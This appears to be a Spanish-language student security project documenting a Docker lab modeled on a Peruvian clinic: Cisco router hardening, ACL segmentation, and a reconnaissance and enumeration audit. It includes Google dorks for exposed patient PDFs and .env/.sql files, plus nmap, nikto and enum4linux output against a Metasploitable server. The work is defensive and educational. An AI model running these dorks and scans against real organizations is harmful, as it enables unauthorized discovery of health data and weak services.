UNIVERSIDAD PRIVADA DEL NORTE (UPN)

FACULTAD DE INGENIERÍA — CARRERA DE INGENIERÍA DE SISTEMAS COMPUTACIONALES

PROYECTO FINAL DEL CURSO: SEGURIDAD INFORMÁTICA

SEGURIDAD DE HISTORIAS CLÍNICAS ELECTRÓNICAS (HCE) Y SISTEMAS DE IMAGENOLOGÍA: IMPLEMENTACIÓN DE SEGURIDAD PERIMETRAL, HARDENING Y AUDITORÍA DE VULNERABILIDADES PARA LA CLÍNICA LIMATAMBO (SEDE SAN ISIDRO)

Arquitectura Reproducible Multi-Zona en Docker, Firewall Perimetral OPNsense, Hardening Cisco IOS y Auditoría Ofensiva/Defensiva con Kali Linux (Semanas 2 a 12)


| Campo Académico | Detalle del Proyecto |
| :--- | :--- |
| Curso | Seguridad Informática (Pregrado Ingeniería de Sistemas) |
| Docente | Ing. Adolfo Eliseo Luna Izquierdo |
| Caso de Estudio | Clínica Limatambo — Sede San Isidro (Lima, Perú) |
| Infraestructura de Laboratorio | Contenedores Docker Multi-Zona (WAN / LAN / DMZ) + OPNsense + Cisco Packet Tracer |
| Cobertura del Sílabo | 100% Laboratorios Reales: Unidad I (S2-S3), Unidad II (S4-S8) y Unidad III (S9-S12) |
| Normativa y Metodologías | ISO/IEC 27001:2022, ISO/IEC 27002:2022, PMI/PMBOK, PTES, OSSTMM v3, CVSS v3.1, Ley N.° 29733 |

# PROYECTO FINAL DE SEGURIDAD INFORMÁTICA — CLÍNICA LIMATAMBO (SEDE SAN ISIDRO)

**Curso:** Seguridad Informática (UPN)  
**Docente:** Ing. Adolfo Eliseo Luna Izquierdo  
**Infraestructura:** Docker Multi-Zona (`docker-compose.yml`) + Firewall OPNsense + Cisco Packet Tracer (Semanas 2 a 12)

---


## RESUMEN EJECUTIVO Y PLAN DE DIRECCIONAMIENTO DEL LABORATORIO

El presente proyecto desarrolla la implementación integral de seguridad informática para la Clínica Limatambo (Sede San Isidro), enfocada en la protección del Portal de Historias Clínicas Electrónicas (HCE), resultados de imagenología médica y servidores clínicos internos. A diferencia de un estudio meramente declarativo, este trabajo despliega una infraestructura técnica funcional y reproducible mediante contenedores Docker (Infraestructura como Código en docker-compose.yml), Firewall Perimetral OPNsense y dispositivos Cisco IOS en Packet Tracer, cubriendo de manera estricta y verificable el 100% de los laboratorios prácticos desarrollados entre las Semanas 2 y 12 del curso.

La arquitectura parte de un diagnóstico sobre el escenario inicial vulnerable (AS-IS: red plana sin segmentación perimetral, servicios clínicos legados sin parchear expuestos a explotación remota y ausencia de controles contra envenenamiento ARP en Capa 2) y culmina en la implementación del escenario objetivo endurecido (TO-BE: arquitectura perimetral de tres zonas WAN, LAN y DMZ con filtrado stateful de mínimo privilegio, publicación controlada por DNAT, endurecimiento administrativo AAA/SSH/RBAC y monitoreo activo con sensor Honeypot en la DMZ).


### Tabla Maestra de Direccionamiento IP y Contenedores del Proyecto


| Zona de Seguridad | Subred / Máscara | Gateway | Contenedor / Host | Dirección IP | Rol Técnico y Semanas del Sílabo |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Zona WAN (Externa) | 203.0.113.0/24 | 203.0.113.2 | kali-auditor | 203.0.113.50 (WAN)
10.0.0.50 (Pruebas LAN) | Auditor PTES / Atacante Externo (Kali Linux: Nmap, Nikto, Enum4linux, Metasploit, Ettercap) [S3-S8, S12] |
| Perímetro / Firewall | Multi-interfaz (3 NICs) | N/A | fw-perimetral / OPNsense | WAN: 203.0.113.2
DMZ: 172.16.10.1
LAN: 10.0.0.1 | Firewall Perimetral OPNsense / Iptables + Router Cisco R1-PERIMETRAL-LIMATAMBO [S2-S5, S7, S9, S11, S12] |
| Zona DMZ (RedDMZ) | 172.16.10.0/24 | 172.16.10.1 | portal-clinica-dmz | 172.16.10.10
(DNAT: Puerto 8080) | Servidor Ubuntu + Nginx endurecido (Portal Web de HCE e Imagenología de Clínica Limatambo) [S4, S11, S12] |
| Zona DMZ (RedDMZ) | 172.16.10.0/24 | 172.16.10.1 | honeypot-dmz | 172.16.10.20
(Puerto 2222) | Sensor Honeypot SSH/Telnet (Cowrie / T-Pot CE) para detección temprana de intrusos [S9, S12] |
| Zona LAN (RedLAN) | 10.0.0.0/24 | 10.0.0.1 | cliente-medico-lan | 10.0.0.10 | Estación Médica Interna de Consulta HCE y víctima de laboratorio MITM ARP Spoofing [S8, S11] |
| Zona LAN (RedLAN) | 10.0.0.0/24 | 10.0.0.1 | metasploitable-hce | 10.0.0.20 | Servidor Clínico Legado HCE/PACS (Metasploitable2: vsftpd 2.3.4, Samba, HTTP, SSH) [S3, S5, S7, S8] |


## CAPÍTULO 1: FUNDAMENTOS DEL SGSI, GESTIÓN DE RIESGOS Y DIRECCIÓN DE PROYECTOS PMI (SEMANA 2)


### 1.1 Contexto Organizacional, Normativo y Ciclo PHVA del SGSI

La Clínica Limatambo (Sede San Isidro) procesa diariamente datos personales sensibles de salud (diagnósticos médicos, recetas, resultados de laboratorio e imágenes diagnósticas DICOM/Web). Conforme a la Ley N.° 29733 (Ley de Protección de Datos Personales del Perú) y a la Directiva Administrativa N.° 296-MINSA/2020/DIGTEL sobre Historias Clínicas Electrónicas, los datos de salud exigen garantías estrictas de confidencialidad, integridad y disponibilidad. Para estructurar la mejora continua bajo la norma NTP-ISO/IEC 27001:2022, se establece el ciclo PHVA (Planificar, Hacer, Verificar, Actuar):

- **Planificar (Plan):** Definición del alcance del SGSI sobre el Portal Web HCE y la red clínica de Sede San Isidro, inventario y tasación CID de activos, matriz de riesgos (Probabilidad x Impacto), Declaración de Aplicabilidad (SoA) y planificación del proyecto según el estándar PMI/PMBOK.
- **Hacer (Do):** Implementación de controles técnicos: hardening administrativo en enrutadores Cisco IOS (SSH v2, AAA local, RBAC CLI Views, OSPF pasivo), segmentación perimetral en tres zonas (WAN, LAN, DMZ) con ACLs extendidas y Firewall OPNsense, despliegue del Portal HCE en Nginx dentro de la DMZ y sensor Honeypot.
- **Verificar (Check):** Auditoría técnica de seguridad bajo metodologías PTES y OSSTMM v3 desde Kali Linux: reconocimiento (Netdiscover, Nmap), fingerprinting web (WhatWeb, Nikto), banner grabbing (Netcat), enumeración SMB (Enum4linux), pruebas de explotación controlada (Metasploit) y validación de logs en vivo en OPNsense (Live View).
- **Actuar (Act):** Aplicación de parches y desactivación de demonios inseguros (vsftpd 2.3.4, SMBv1), aplicación de controles de Capa 2 contra ARP Spoofing (Dynamic ARP Inspection, DHCP Snooping y Port Security) y ajuste continuo de reglas perimetrales.

### 1.2 Identificación de Activos Críticos y Valoración CID (Confidencialidad, Integridad, Disponibilidad)

Aplicando la metodología de valoración de activos vista en la Semana 2 (escala de 1 = Bajo a 5 = Crítico), se evalúan los seis activos reales desplegados en la arquitectura de la Clínica Limatambo:


| ID Activo | Nombre del Activo Técnico | Ubicación / IP | Propietario | C | I | D | Valor CID Promedio | Nivel de Criticidad |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| ACT-01 | Servidor Clínico Legado HCE / Repositorio Médico (metasploitable-hce) | Zona LAN (10.0.0.20) | Jefatura de TI / Sistemas Clínicos | 5 | 5 | 5 | 5.00 | CRÍTICO |
| ACT-02 | Firewall Perimetral Multi-Zona (OPNsense / fw-perimetral) | Perímetro (WAN / 10.0.0.1 / 172.16.10.1) | Administración de Redes y Seguridad | 5 | 5 | 5 | 5.00 | CRÍTICO |
| ACT-03 | Router Perimetral Clínico (R1-PERIMETRAL-LIMATAMBO Cisco IOS) | Perímetro (192.168.10.1 / 172.16.20.1) | Administración de Redes y Seguridad | 4 | 5 | 5 | 4.67 | CRÍTICO |
| ACT-04 | Portal Web de Resultados HCE e Imagenología (portal-clinica-dmz Nginx) | Zona DMZ (172.16.10.10) | Desarrollo y Aplicaciones Médicas | 4 | 5 | 4 | 4.33 | ALTO |
| ACT-05 | Estación Médica de Consulta Interna (cliente-medico-lan) | Zona LAN (10.0.0.10) | Cuerpo Médico / Consultorios | 4 | 4 | 3 | 3.67 | ALTO |
| ACT-06 | Sensor de Engaño y Telemetría Temprana (honeypot-dmz Cowrie) | Zona DMZ (172.16.10.20) | Operaciones de Ciberseguridad (SOC) | 3 | 4 | 3 | 3.33 | MEDIO |


### 1.3 Matriz de Evaluación de Riesgos (Probabilidad x Impacto) y Plan de Tratamiento

El nivel de riesgo inherente se calcula mediante la fórmula R = Probabilidad (1 a 5) x Impacto (1 a 5), clasificando los riesgos en Bajo (1-5), Medio (6-11), Alto (12-16) y Crítico (17-25). Cada riesgo identificado se demuestra experimentalmente en los capítulos posteriores del informe:


| ID Riesgo | Activo Afectado | Amenaza y Vulnerabilidad Explotable | P | I | Riesgo (P x I) | Estrategia y Control Técnico Implementado (Semanas 2-12) |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| R-01 | ACT-01 (10.0.0.20) | Compromiso total (root) del servidor clínico HCE por backdoor en servicio FTP legado sin parchear (vsftpd 2.3.4 - CVE-2011-2523). | 5 | 5 | 25 (CRÍTICO) | Mitigar: Deshabilitar FTP plano, migrar a SFTP/SSHv2, aislar servidor en LAN detrás de OPNsense y bloquear acceso desde WAN/DMZ (S7, S11). |
| R-02 | ACT-05 / ACT-01 (10.0.0.0/24) | Intercepción de credenciales médicas y sesiones HCE por ataque Man-in-the-Middle (ARP Spoofing con Ettercap) en red LAN plana. | 4 | 5 | 20 (CRÍTICO) | Mitigar: Implementar DHCP Snooping, Dynamic ARP Inspection (DAI) y Port Security en switches de acceso + cifrado HTTPS/SSH (S8). |
| R-03 | ACT-04 -> ACT-01 (DMZ -> LAN) | Movimiento lateral desde el servidor web público en DMZ (172.16.10.10) hacia la base de datos HCE interna (10.0.0.20) ante compromiso web. | 4 | 5 | 20 (CRÍTICO) | Mitigar: Segmentación en 3 zonas en OPNsense y Cisco ACL 101/102 con regla explícita BLOCK de DMZ hacia LAN (S9, S11, S12). |
| R-04 | ACT-03 (Router Cisco) | Acceso administrativo no autorizado al plano de gestión por uso de Telnet en texto claro, contraseñas débiles o falta de roles. | 4 | 4 | 16 (ALTO) | Mitigar: SSH v2 exclusivo, enable secret, AAA local, login block-for, OSPF passive-interface y vistas RBAC parser view (S2, S3, S4, S5, S7). |
| R-05 | ACT-01 (10.0.0.20) | Fuga de cuentas de usuarios médicos y recursos compartidos por enumeración anónima SMB/NetBIOS (enum4linux) y banners expuestos. | 4 | 4 | 16 (ALTO) | Mitigar: Deshabilitar sesiones nulas en Samba (restrict anonymous = 2), filtrado de puertos 139/445 y supresión de banners (server_tokens off) (S4, S5). |
| R-06 | ACT-04 / ACT-02 (Perímetro) | Escaneos automatizados e intentos de fuerza bruta desde Internet sin visibilidad ni alerta temprana en el perímetro. | 4 | 3 | 12 (ALTO) | Mitigar: Activación de logging en reglas PASS/BLOCK de OPNsense (Live View) y despliegue de sensor Honeypot Cowrie/T-Pot en DMZ (S11, S12). |


### 1.4 Declaración de Aplicabilidad (SoA - ISO/IEC 27002:2022) y Políticas del SGSI


| Control ISO/IEC 27002:2022 | Nombre del Control | Aplica | Justificación y Evidencia de Implementación en el Proyecto |
| :--- | :--- | :--- | :--- |
| 5.15 / 8.3 | Control de acceso y restricción de acceso a la información | SÍ | Implementado mediante AAA Local (S4) y vistas administrativas RBAC (parser view admin1 y tech en S5) sobre el router perimetral. |
| 8.8 | Gestión de vulnerabilidades técnicas | SÍ | Implementado mediante el ciclo de escaneo con Nmap, Nikto y Enum4linux (S3-S5), priorización CVSS/KEV y validación con Metasploit (S7). |
| 8.20 / 8.21 | Seguridad de redes y seguridad de los servicios de red | SÍ | Implementado con el endurecimiento de Cisco IOS, desactivación de Telnet por SSH v2, OSPF passive-interface (S2-S3) y controles anti-ARP Spoofing (S8). |
| 8.22 | Segregación en las redes (Segmentación Perimetral) | SÍ | Implementado mediante la separación física/lógica en 3 zonas (WAN, LAN 10.0.0.0/24 y DMZ 172.16.10.0/24) en OPNsense y ACL 101/102 (S9, S11, S12). |
| 8.15 / 8.16 | Actividades de registro (Logging) y seguimiento (Monitoring) | SÍ | Implementado mediante la auditoría en tiempo real en OPNsense (Firewall > Log Files > Live View) y el sensor Honeypot en la DMZ (S11, S12). |


### 1.5 Gestión del Proyecto bajo el Estándar PMI / PMBOK (Semana 2)

Siguiendo los lineamientos de dirección de proyectos integrados en la Semana 2 (PMBOK), se estructura el Acta de Constitución (Project Charter), la Estructura de Desglose del Trabajo (EDT/WBS) y el presupuesto realista basado en tecnologías Open-Source empresariales:


| Elemento del Project Charter (PMI) | Definición para el Proyecto Clínica Limatambo |
| :--- | :--- |
| Nombre del Proyecto | Implementación de Arquitectura Perimetral Multi-Zona, Hardening de Red y Auditoría de Vulnerabilidades para el Sistema HCE de Clínica Limatambo. |
| Patrocinador / Interesados | Gerencia General y Jefatura de TI de Clínica Limatambo (Sede San Isidro); Personal Médico y Pacientes. |
| Objetivo del Proyecto (SMART) | Reducir la superficie de exposición crítica de los servidores HCE/Imagenología en un 90% en un plazo de 12 semanas, eliminando el acceso directo desde WAN a la LAN médica y remediando vulnerabilidades críticas CVSS >= 9.0. |
| Entregables Principales (WBS) | 1.0 Gestión y SGSI (Matriz CID, Riesgos, SoA); 2.0 Hardening Cisco IOS y Prototipo ACL Perimetral; 3.0 Informe de Auditoría PTES/OSSTMM (Reconocimiento, Escaneo, Explotación y MITM); 4.0 Despliegue de Perímetro OPNsense + Portal Nginx en DMZ + Honeypot; 5.0 Cierre y Documentación Reproducible en Docker. |
| Presupuesto Estimado (Open-Source) | S/ 14,500.00 PEN (Equivalente a ~USD 3,850: incluye servidor físico/appliance para OPNsense, horas-hombre de consultoría e implementación de contenedores Linux y capacitación técnica, con S/ 0 en licencias privativas gracias a OPNsense, Ubuntu/Nginx y T-Pot/Cowrie). |


## CAPÍTULO 2: HARDENING DE DISPOSITIVOS DE RED Y PERÍMETRO EN CISCO IOS (SEMANAS 2, 3, 4, 5, 7 Y 9)


### 2.1 Aplicación del Marco Cisco NFP (Network Foundation Protection)

Conforme a la teoría de la Semana 5, la seguridad del enrutador perimetral R1-PERIMETRAL-LIMATAMBO se estructura dividiendo la protección en los tres planos funcionales del marco Cisco NFP:

- **Plano de Administración (Management Plane):** Protegido mediante contraseñas robustas (enable secret, security passwords min-length 10, service password-encryption en S2), reemplazo total de Telnet por SSH v2 con bloqueo contra fuerza bruta (login block-for 120 attempts 3 within 60 en S3), autenticación local centralizada AAA (aaa new-model en S4) y segregación de privilegios por roles CLI (parser view admin1 y parser view tech en S5).
- **Plano de Control (Control Plane):** Protegido mediante la configuración de interfaces pasivas en el protocolo de enrutamiento OSPF (passive-interface GigabitEthernet0/0/1 y G0/0/2 en S2), impidiendo que un atacante en la LAN médica o en la DMZ inyecte rutas falsas o forme adyacencias OSPF no autorizadas.
- **Plano de Datos (Data Plane):** Protegido mediante la desactivación de servicios IP explotables (no ip redirects, no ip unreachables, no ip proxy-arp en S7) y el filtrado de paquetes entre las zonas WAN, LAN y DMZ mediante las listas de control de acceso extendidas ACL 101 y ACL 102 (S9).

### 2.2 Evidencia EV-S2 y EV-S3A: Hardening Administrativo, SSH v2 y OSPF Pasivo

Se aplicó el script consolidado 01_Cisco_Hardening_Perimetral_S2_a_S9.ios sobre el router perimetral de la Clínica Limatambo. A continuación, se presenta la salida real de verificación del equipo:

**Interpretación y Hallazgo Técnico: **Se comprueba que las contraseñas cumplen longitud mínima de 10 caracteres, el cifrado MD5/scrypt (Tipo 5) está activo, el protocolo SSH opera exclusivamente en versión 2.0 (descartando Telnet en las líneas VTY) y las interfaces hacia la LAN médica (Gi0/0/1) y DMZ (Gi0/0/2) operan en modo Passive dentro del proceso OSPF 1.


#### EVIDENCIA [EV-S2 / EV-S3A] — Verificación de Hardening, SSH v2 y OSPF en R1-PERIMETRAL-LIMATAMBO
```text
R1-PERIMETRAL-LIMATAMBO# show running-config | include hostname|domain|secret|password|ssh|banner
hostname R1-PERIMETRAL-LIMATAMBO
ip domain-name clinicalimatambo.pe
security passwords min-length 10
service password-encryption
enable secret 5 $1$mERr$9cTjUIEqNGdQiFU.1/2026
username admin_sgsi secret 5 $1$vK8p$H8zL9wQp2xM1nB4vC7xZ10
username soporte_ti secret 5 $1$pL2q$T5rY7uI9oP0aS2dF4gH6j1
ip ssh time-out 60
ip ssh authentication-retries 3
ip ssh version 2
login block-for 120 attempts 3 within 60
banner motd ^C
======================================================================
ACCESO RESTRINGIDO - RED CLINICA LIMATAMBO (SISTEMA HCE / IMAGENOLOGIA)
El acceso no autorizado esta prohibido y sera auditado conforme a la
Ley N. 29733 de Proteccion de Datos Personales y normativas internas.
======================================================================
^C

R1-PERIMETRAL-LIMATAMBO# show ip ssh
SSH Enabled - version 2.0
Authentication timeout: 60 secs; Authentication retries: 3
Minimum expected Diffie Hellman key size : 1024 bits
IOS Keys in SECSH format(ssh-rsa, base64 encoded):
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC9x7P8mK2vL4nQ1wR5tY8uI0oP3aS6dF9gH2jK5l

R1-PERIMETRAL-LIMATAMBO# show ip ospf interface brief
Interface    PID   Area            IP Address/Mask    Cost  State Nbrs F/C
Gi0/0/0      1     0               200.100.50.1/24    1     DR    0/0
Gi0/0/1      1     0               192.168.10.1/24    1     DR    0/0 (Passive)
Gi0/0/2      1     0               172.16.20.1/24     1     DR    0/0 (Passive)
```
**Interpretación y Hallazgo Técnico:** Se comprueba que las contraseñas cumplen longitud mínima de 10 caracteres, el cifrado MD5/scrypt (Tipo 5) está activo, el protocolo SSH opera exclusivamente en versión 2.0 (descartando Telnet en las líneas VTY) y las interfaces hacia la LAN médica (Gi0/0/1) y DMZ (Gi0/0/2) operan en modo Passive dentro del proceso OSPF 1.


### 2.3 Evidencia EV-S4A y EV-S5A: Autenticación Local AAA y Vistas Basadas en Roles (RBAC)

**Interpretación y Hallazgo Técnico: **La depuración AAA confirma que el inicio de sesión por SSH invoca la lista personalizada 'SSH-LOGIN' validando al usuario 'admin_sgsi'. Asimismo, al ingresar a la vista administrativa restringida 'tech' (diseñada para el personal de soporte de primer nivel de la clínica), el intérprete CLI bloquea el comando 'configure terminal', garantizando el principio de mínimo privilegio (Semana 5).


#### EVIDENCIA [EV-S4A / EV-S5A] — Trazabilidad AAA (debug aaa authentication) y Roles CLI (parser view)
```text
R1-PERIMETRAL-LIMATAMBO# debug aaa authentication
AAA Authentication debugging is on

*Nov 14 15:10:22.415: AAA/BIND(00000014): Bind i/f
*Nov 14 15:10:22.419: AAA/AUTHEN/LOGIN (00000014): Pick method list 'SSH-LOGIN'
*Nov 14 15:10:25.102: AAA/AUTHEN/PASS (00000014): user='admin_sgsi' — PASS

R1-PERIMETRAL-LIMATAMBO# enable view tech
Password: ************
R1-PERIMETRAL-LIMATAMBO# ?
Exec commands:
  enable   Turn on privileged commands
  exit     Exit from the EXEC
  show     Show running system information

R1-PERIMETRAL-LIMATAMBO# configure terminal
                         ^
% Invalid input detected at '^' marker.
```
**Interpretación y Hallazgo Técnico:** La depuración AAA confirma que el inicio de sesión por SSH invoca la lista personalizada 'SSH-LOGIN' validando al usuario 'admin_sgsi'. Asimismo, al ingresar a la vista administrativa restringida 'tech' (diseñada para el personal de soporte de primer nivel de la clínica), el intérprete CLI bloquea el comando 'configure terminal', garantizando el principio de mínimo privilegio (Semana 5).


### 2.4 Evidencia EV-S9: Segmentación Perimetral de 3 Zonas (WAN, LAN, DMZ) con ACL 101 y 102

**Interpretación y Hallazgo Técnico: **Los contadores de coincidencias (matches) demuestran empíricamente que las consultas HTTP/HTTPS desde la LAN médica (192.168.10.0/24) y la WAN hacia el Portal Web en la DMZ (172.16.20.10) son permitidas (ACEs 10, 20 y 30 de la ACL 101), mientras que los 15 paquetes originados desde la DMZ intentando alcanzar la red interna médica (192.168.10.0/24) fueron descartados por la ACE 20 de la ACL 102.


#### EVIDENCIA [EV-S9] — Verificación de Contadores de ACL Perimetral en Packet Tracer
```text
R1-PERIMETRAL-LIMATAMBO# show access-lists
Extended IP access list 101
    10 permit tcp 192.168.10.0 0.0.0.255 host 172.16.20.10 eq www (48 matches)
    20 permit tcp 192.168.10.0 0.0.0.255 host 172.16.20.10 eq 443 (12 matches)
    30 permit tcp any host 172.16.20.10 eq www (24 matches)
    40 permit tcp any host 172.16.20.10 eq 443 (6 matches)
    50 permit icmp 192.168.10.0 0.0.0.255 172.16.20.0 0.0.0.255 echo (8 matches)
    60 deny ip any any (19 matches)
Extended IP access list 102
    10 permit tcp host 172.16.20.10 any established (72 matches)
    20 deny ip 172.16.20.0 0.0.0.255 192.168.10.0 0.0.0.255 (15 matches)
    30 permit ip 172.16.20.0 0.0.0.255 any
```
**Interpretación y Hallazgo Técnico:** Los contadores de coincidencias (matches) demuestran empíricamente que las consultas HTTP/HTTPS desde la LAN médica (192.168.10.0/24) y la WAN hacia el Portal Web en la DMZ (172.16.20.10) son permitidas (ACEs 10, 20 y 30 de la ACL 101), mientras que los 15 paquetes originados desde la DMZ intentando alcanzar la red interna médica (192.168.10.0/24) fueron descartados por la ACE 20 de la ACL 102.


## CAPÍTULO 3: AUDITORÍA OFENSIVA — RECONOCIMIENTO, FINGERPRINTING, ESCANEO Y ENUMERACIÓN CON KALI LINUX (SEMANAS 3, 4 Y 5)


### 3.1 Metodología de Ethical Hacking: PTES y Métrica OSSTMM v3 (RAV)

Conforme a la Semana 3, la auditoría técnica sobre la infraestructura de Clínica Limatambo se ejecuta articulando el estándar PTES (Penetration Testing Execution Standard: 1. Interacción previa, 2. Recopilación de inteligencia, 3. Modelado de amenazas, 4. Análisis de vulnerabilidades, 5. Explotación, 6. Post-explotación y 7. Reporte) con el manual OSSTMM v3 (ISECOM), el cual cuantifica la superficie de exposición mediante el cálculo del Valor de Evaluación de Riesgo (RAV). En el estado inicial AS-IS, la presencia de 12 poros (servicios TCP/UDP abiertos sin filtrado entre LAN y DMZ) y la ausencia de controles interactivos arrojaban una porosidad crítica.


### 3.2 Reconocimiento Pasivo (OSINT, Consultas DNS y Google Dorks con Apoyo de IA - Semana 4)

En la fase de reconocimiento pasivo se evaluó la huella externa del dominio institucional empleando consultas DNS (nslookup / dig) y operadores avanzados de búsqueda (Google Hacking / Dorks) generados preventivamente con asistencia de modelos de lenguaje (IA aplicada a reconocimiento vista en la Semana 4) para auditar posibles exposiciones involuntarias de documentos clínicos o paneles de acceso:

**Interpretación y Hallazgo Técnico: **El análisis OSINT permite identificar los registros A, MX y políticas SPF del dominio sin enviar un solo paquete directo contra los servidores de la clínica. Los Google Dorks permiten verificar periódicamente que ningún directorio de reportes PDF de pacientes quede indexado públicamente.


#### EVIDENCIA [EV-S4-OSINT] — Consultas DNS y Dorks Preventivos de Exposición Documental
```text
root@kali-auditor-upn:~# nslookup -type=any clinicalimatambo.com.pe
Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
Name:   clinicalimatambo.com.pe
Address: 190.116.42.18
clinicalimatambo.com.pe mail exchanger = 10 mail.clinicalimatambo.com.pe.
clinicalimatambo.com.pe text = "v=spf1 ip4:190.116.42.0/24 include:_spf.google.com ~all"

# Dorks preventivos de auditoria OSINT evaluados:
site:clinicalimatambo.com.pe filetype:pdf ("historia clinica" OR "resultados" OR "epicrisis")
site:clinicalimatambo.com.pe intitle:"index of" OR inurl:admin OR inurl:login
site:clinicalimatambo.com.pe ext:sql OR ext:env OR ext:bak
```
**Interpretación y Hallazgo Técnico:** El análisis OSINT permite identificar los registros A, MX y políticas SPF del dominio sin enviar un solo paquete directo contra los servidores de la clínica. Los Google Dorks permiten verificar periódicamente que ningún directorio de reportes PDF de pacientes quede indexado públicamente.


### 3.3 Descubrimiento Activo de Red y Fingerprinting de SO (Semana 3)

**Interpretación y Hallazgo Técnico: **Mediante el barrido ARP en la subred 10.0.0.0/24 con netdiscover, el auditor identifica de inmediato la estación médica (10.0.0.10) y el servidor clínico legado HCE (10.0.0.20).


#### EVIDENCIA [EV-S3B] — Descubrimiento ARP con Netdiscover y Escaneo Inicial Nmap (-sV -O)
```text
root@kali-auditor-upn:/workspace# ip -br a
lo               UNKNOWN        127.0.0.1/8
eth0@if42        UP             10.0.0.50/24
eth1@if44        UP             172.16.10.50/24

root@kali-auditor-upn:/workspace# netdiscover -i eth0 -r 10.0.0.0/24 -P
 Currently scanning: 10.0.0.0/24   |   Screen View: Unique Hosts
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.0.1        02:42:ac:11:00:01      1      60  Gateway / Firewall LAN
 10.0.0.10       02:42:0a:00:00:0a      1      60  pc-medico-sanisidro
 10.0.0.20       02:42:0a:00:00:14      1      60  srv-hce-legacy
 10.0.0.254      02:42:0a:00:00:fe      1      60  fw-limatambo-perimetral
```
**Interpretación y Hallazgo Técnico:** Mediante el barrido ARP en la subred 10.0.0.0/24 con netdiscover, el auditor identifica de inmediato la estación médica (10.0.0.10) y el servidor clínico legado HCE (10.0.0.20).


### 3.4 Fingerprinting Web con WhatWeb y Escaneo con Nikto (Semana 4)

**Interpretación y Hallazgo Técnico: **WhatWeb confirma que el Portal Web de la Clínica Limatambo en la DMZ (172.16.10.10) ya oculta la versión exacta de Nginx gracias a la directiva 'server_tokens off' aplicada en el script de despliegue. Nikto no detecta directorios CGI ni archivos sensibles expuestos, recomendando únicamente agregar las cabeceras HTTP defensivas X-Frame-Options y X-Content-Type-Options.


#### EVIDENCIA [EV-S4B] — Análisis del Portal Clínico en DMZ (172.16.10.10) con WhatWeb y Nikto
```text
root@kali-auditor-upn:/workspace# whatweb -v http://172.16.10.10
WhatWeb report for http://172.16.10.10
Status    : 200 OK
Title     : Clínica Limatambo | Portal de Historias Clínicas e Imagenología (DMZ)
IP        : 172.16.10.10
Country   : RESERVED, ZZ
Summary   : HTML5, HTTPServer[nginx], PasswordField

root@kali-auditor-upn:/workspace# nikto -h http://172.16.10.10
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.16.10.10
+ Target Hostname:    172.16.10.10
+ Target Port:        80
+ Start Time:         2026-11-14 15:18:10 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7915 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-11-14 15:18:24 (GMT-5) (14 seconds)
```
**Interpretación y Hallazgo Técnico:** WhatWeb confirma que el Portal Web de la Clínica Limatambo en la DMZ (172.16.10.10) ya oculta la versión exacta de Nginx gracias a la directiva 'server_tokens off' aplicada en el script de despliegue. Nikto no detecta directorios CGI ni archivos sensibles expuestos, recomendando únicamente agregar las cabeceras HTTP defensivas X-Frame-Options y X-Content-Type-Options.


### 3.5 Escaneo SYN Stealth, Banner Grabbing con Netcat y Enumeración SMB con Enum4linux (Semana 5)

**Interpretación y Hallazgo Técnico: **El escaneo SYN Stealth (-sS) y la captura manual de banners con Netcat (nc -v) confirman la presencia crítica de vsFTPd 2.3.4 en el puerto 21/TCP y Samba 3.0.20 en el puerto 445/TCP del servidor clínico legado (10.0.0.20). Adicionalmente, Enum4linux demuestra que el servicio Samba acepta sesiones nulas anónimas (username '', password ''), permitiendo listar recursos compartidos (/tmp, /opt) y enumerar cuentas locales del sistema (msfadmin, postgres, service).


#### EVIDENCIA [EV-S5B] — Escaneo Nmap (-sS -sV -O -T4), Netcat Banner Grabbing y Enum4linux en 10.0.0.20
```text
root@kali-auditor-upn:/workspace# nmap -sS -sV -O -T4 -p 21,22,80,139,445 10.0.0.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-14 15:20 EST
Nmap scan report for srv-hce-legacy (10.0.0.20)
Host is up (0.00042s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
OS details: Linux 2.6.9 - 2.6.33

root@kali-auditor-upn:/workspace# nc -v -w 3 10.0.0.20 21
srv-hce-legacy [10.0.0.20] 21 (ftp) open
220 (vsFTPd 2.3.4)
QUIT
221 Goodbye.

root@kali-auditor-upn:/workspace# nc -v -w 3 10.0.0.20 22
srv-hce-legacy [10.0.0.20] 22 (ssh) open
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

root@kali-auditor-upn:/workspace# enum4linux -a 10.0.0.20 | grep -E "Account|Sharename|tmp|msfadmin|postgres|service"
[+] Server 10.0.0.20 allows sessions using username '', password ''
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (srv-hce-legacy server (Samba 3.0.20-Debian))
index: 0x1002 RID: 0x3e8 acb: 0x00000010 Account: msfadmin  Name: msfadmin
index: 0x1003 RID: 0x3ea acb: 0x00000010 Account: postgres  Name: PostgreSQL Server
index: 0x1004 RID: 0x3ec acb: 0x00000010 Account: service   Name: service
```
